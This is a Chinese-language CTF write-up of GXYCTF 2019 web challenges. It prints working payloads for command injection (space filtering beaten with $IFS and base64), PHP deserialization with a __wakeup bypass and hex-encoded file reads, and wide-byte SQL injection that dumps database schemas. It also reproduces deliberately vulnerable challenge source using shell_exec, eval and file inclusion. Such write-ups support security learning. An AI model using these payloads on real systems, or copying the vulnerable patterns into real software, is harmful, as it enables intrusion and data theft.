categories:
- 比赛
tags:
- wp
- 线上赛
- ctf
cover:  https://i.loli.net/2019/12/22/3uy4TPRNtjdelD9.png
title:  gxytf2019
---
# gxyctf





## ping ping ping

过滤$,' ',

未过滤符号:`!,#,$,%,(,.,+,-,:,;,=`

过滤空格用$IFS来代替

过滤flag

用base64来绕过

`aasdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS``cat`

```php
	<?php
	if(isset($_GET['ip'])){
		$ip = $_GET['ip'];
		if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
			echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
			die("fxck your symbol!");
		}
		else if(preg_match("/ /", $ip)){
			die("fxck your space!");
		}
		else if(preg_match("/bash/", $ip)){
			die("fxck your bash!");
		}
		else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
			die("fxck your flag!");
		}
		$a = shell_exec("ping -c 4 ".$ip);
		echo "<pre>";
		print_r($a);
	}

	?>
```

`asdf||echo$IFS$1ZmxhZy5waHA=|base64$IFS-d|xargs$IFS$IFS$1cat`



## upload



**没做出来忽略他**



上传类型也太露骨了把:检测后缀还是上传类型?

Content-Type: image/jpeg,可以上传了

上传文件后无法访问404

上传文件所在文件夹和session有关

将session置空后报错

```html
<b>Warning</b>:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and '-,' in <b>/var/www/html/index.php</b> on line <b>2</b><br />
<br />
<b>Warning</b>:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/index.php:2) in <b>/var/www/html/index.php</b> on line <b>2</b><br />
```



猜测随机生成一个值放到session里面

php版本5.6可以%00截断



后缀不能以ph结尾



##  Do you know robot 



>PHP 在反序列化 string 时没有严格按照序列化格式 `s:x:"x"; `进行处理，没有对 `" `后面的是否存在 `;` 进行判断，同时增加了对十六进制形式字符串的处理，这样前后处理的不一致让人很费解，同时由于 PHP 手册中对此没有详细的说明，大部分程序员对此处理过程并不了解，这可能导致其在编码过程中出现疏漏，甚至导致严重的安全问题。

```php
<?php 
class FileReader{
	public $Filename;
	public $start;
	public $max_length;
	function __construct(){
		$this->Filename = __DIR__ . "/bcm.txt";
		$this->start = 12;
		$this->max_length = 72;
	}

	function __wakeup(){
		$this->Filename = __DIR__ . "/fake_f1ag.php";
		$this->start = 10;
		$this->max_length = 0;
		echo "<script>alert(1)</script>";
	}

	function __destruct(){
		$data = file_get_contents($this->Filename, 0, NULL, $this->start, $this->max_length);
		if(preg_match("/\{|\}/", $data)){
			die("you can't read flag!");
		}
		else{
			echo $data;
		}
	}
}

if(isset($_GET['exp'])){
	if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['exp'])){
		die("hack!");
	}
	$exp = $_REQUEST['exp'];
	$e = unserialize($exp);
	echo $e->Filename;
}
else{
	$exp = new FileReader();
}


?>
```

令属性数量与实际数量不同来绕过`__wakeup`

利用16进制绕过flag的限制

`O:10:"FileReader":4:{s:8:"Filename";S:71:"\70\68\70\3a\2f\2f\66\69\6c\74\65\72\2f\72\65\61\64\3d\63\6f\6e\76\65\72\74\2e\62\61\73\65\36\34\2d\65\6e\63\6f\64\65\2f\72\65\73\6f\75\72\63\65\3d\2f\76\61\72\2f\77\77\77\2f\68\74\6d\6c\2f\66\6c\61\67\2e\70\68\70";s:5:"start";i:0;s:10:"max_length";i:10000;}`



### 解法二

正则匹配的四`$_GET`,而传的参数是`$_REQUEST`,从而绕过



## sql1



union select 设置自己的密码拿到flag





## 禁止套娃



### 解法一



和bytectf2019有点类似 https://blog.zeddyu.info/2019/09/17/bytectf2019/ 





`var_dump(scandir(chr(time())));`



` array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(4) ".git" [3]=> string(8) "flag.php" [4]=> string(9) "index.php" } `

chr,random_bytes

翻数组相关的函数找到array_rand,但是遗憾的是返回的是键名,如果我们能交换键名和值就可以拿到flag.php了,再找一找发现array_filp

最后的payload

`var_dump(readfile(array_rand(array_flip(scandir(chr(time()))))));`

### 解法二

`readfile(session_id(session_start()))`

然后`PHPSESSID=flag.php`读到flag







##  BabySqliv2.0

提到中文,宽字节注入绕过引号

过滤select,union,where等

`a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),1%23`

回显密码

`a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(schema_name)+FROM+information_schema.schemata)%23`



数据库:`information_schema,web_sqli`

`a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(table_name)+FROM+information_schema.tables+WHEwhereRE+TABLE_SCHEMA=database())%23`

表:`f14g,user`

`a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(column_name)+FROM+information_schema.columns+WHwhereERE+table_name=char(102,49,52,103))%23`



列:`b80bb7740288fda1f201890375a60c8f,327a6c4304ad5938eaf0efb6cc3e53dc`



读取flag,但是有长度限制

最后得到抖肩舞+flag

GXY{g0Od_job1im_so_vegetable}



## babysqliv3.0

对phpsession注入报错

```html
<br />
<b>Warning</b>:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and '-,' in <b>/var/www/html/search.php</b> on line <b>2</b><br />
<br />
<b>Warning</b>:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/search.php:2) in <b>/var/www/html/search.php</b> on line <b>2</b><br />
<meta http-equiv="Content-Type" content="text/html; charset=uft-8"/><title>login</title><script>alert('Wrong pass');location.href='./index.php'</script><br />
<b>Warning</b>:  Unknown: The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and '-,' in <b>Unknown</b> on line <b>0</b><br />
<br />
<b>Warning</b>:  Unknown: Failed to write session data (files). Please verify that the current setting of session.save_path is correct () in <b>Unknown</b> on line <b>0</b><br />

```

```
[21:19:28] 200 -   89B  - /home.php
[21:19:29] 200 -  562B  - /index.php
[21:19:35] 200 -  253B  - /upload.php
[21:19:35] 301 -  327B  - /uploads  ->  http://183.129.189.60:10023/uploads/
[21:19:35] 403 -  300B  - /uploads/
```

fuzz一下发现没啥好注的

再结合扫到的东东,爆破得到密码password

文件上传没用?上传后没有任何提示

content-type改为jpeg,可以上传但是后缀是.txt

如果能控制后缀就可以文件包含了尝试文件名处%00截断无效







home处有文件包含,但是会再末尾添加.fxxkyou(home.php和upload.php不会)

因为题目环境是5.6,尝试%00截断 [ x ]

这里我发现我对文件上传和文件包含部分的掌握不好,以及思考解决方法时候的思考方式不太行

这里利用伪协议直接读取代码,但是我却偏偏没想到这么基础的东西.回去重新学习一下文件包含和上传



代码审计发现phar反序列化可以命令执行

已被魔改

home.php

```php
<?php
echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <title>Home</title>";
error_reporting(0);

if(isset($_GET['file'])){
    if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
        die("hacker!");
    }
    else{
        if(preg_match("/home$/i", $_GET['file']) or preg_match("/upload$/i", $_GET['file'])){
            $file = $_GET['file'].".php";
        }
        else{
            $file = $_GET['file'].".fxxkyou!";
        }
        echo "当前引用 ".$file;
        require $file;
    }
    
}
else{
    die("no permission!");
}

?>
```

upload.php

```php

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 

<form action="" method="post" enctype="multipart/form-data">
	上传
	<input type="file" name="file" />
	<input type="submit" name="submit" value="提交" />
</form>

<?php
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
	

	function __construct(){
		$sandbox = getcwd()."/uploads/".md5("admin")."/";
		$ext = ".txt";
		@mkdir($sandbox, 0777, true);
		if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
			$this->Filename = $_GET['name'];
		}
		else{
			$this->Filename = $sandbox."admin".$ext;
		}

		$this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
		$this->token = "admin";
	}

	function upload($file){
		global $sandbox;
		global $ext;

		if(preg_match("[^a-z0-9]", $this->Filename)){
			$this->cmd = "die('illegal filename!');";
		}
		else{
			if($file['size'] > 1024){
				$this->cmd = "die('you are too big ( :) )');";
			}
			else{
				$this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
			}
		}
	}

	function __toString(){
		global $sandbox;
		global $ext;
		// return $sandbox.$this->Filename.$ext;
		return $this->Filename;
	}

	function __destruct(){
		if($this->token != "admin"){
			$this->cmd = "die('check token falied!');";
		}
        eval($this->cmd);
        echo "__destruct";
    }
    
}

if(isset($_FILES['file'])) {
	$uploader = new Uploader();
	$uploader->upload($_FILES["file"]);
	if(@file_get_contents($uploader)){
		echo "成功上传<br>".$uploader."<br>";
		echo file_get_contents($uploader);
	}
}

?>

```

## 参考(其他人的wp)

1.  http://www.qfrost.com/PWN/GXY_CTF/ 

